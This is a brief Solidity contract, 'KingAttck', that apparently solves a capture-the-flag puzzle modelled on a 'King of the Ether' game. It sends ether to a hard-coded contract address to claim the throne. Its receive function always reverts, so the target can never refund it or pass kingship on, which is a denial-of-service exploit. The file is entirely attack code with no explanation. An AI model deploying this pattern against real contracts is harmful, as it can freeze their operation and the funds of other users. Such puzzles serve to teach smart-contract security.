pragma solidity ^0.8.0;

contract KingAttck {
    constructor() {}

    function take_kingship() public payable {
        payable(0x9Ad19ea506D78965805dF36860b3A68Def674FAa).transfer(msg.value);
    }

    receive() external payable {
        revert();
    }
}